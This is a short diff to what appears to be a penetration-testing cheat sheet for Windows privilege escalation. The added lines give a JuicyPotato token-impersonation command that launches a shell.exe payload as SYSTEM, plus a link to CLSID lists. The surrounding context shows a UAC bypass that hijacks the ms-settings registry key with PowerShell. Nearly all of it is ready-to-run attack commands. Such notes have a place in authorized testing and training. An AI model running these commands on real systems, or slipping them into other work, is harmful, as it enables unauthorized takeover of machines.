@@ -893,6 +893,12 @@ python3 exploit.py
 whoami
 net user {USERNAME}
 
+# Check Privledges for Impersonation
+whoami /priv
+JuicyPotato.exe -l 1337 -p C:\Users\Public\Downloads\shell.exe -t * -c {CLSID}
+
+https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+
 # UAC BYPASS
  New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value {C:\Path\to\Exploit\exploit.exe} -Force
 New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
